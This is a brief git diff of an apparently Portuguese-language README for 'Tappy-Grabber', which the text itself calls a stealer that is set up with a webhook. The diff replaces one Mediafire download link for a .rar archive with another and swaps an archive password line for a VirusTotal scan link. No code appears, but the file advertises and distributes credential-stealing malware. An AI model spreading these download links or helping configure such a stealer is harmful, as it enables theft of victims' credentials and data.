@@ -9,9 +9,9 @@
 * 3- Uma webhook para criar seu stealer.
 
 <br>
-💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/iwt5ak5i2xyb3id/Tappy-Grabber.rar/file
+💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/gapz85o1dpcdhe8/Tappy-Grabber.rar/file
 
-💸 <b>• SENHA :</b> Polar
+💸 <b>• SCAN ONLINE  :</b> https://www.virustotal.com/gui/file/d00fec41d9f7ff29aef64ee612c1fe69ad5a944c742e8cb7c61f4a5d55f9107e?nocache=1
 
 
 <br>
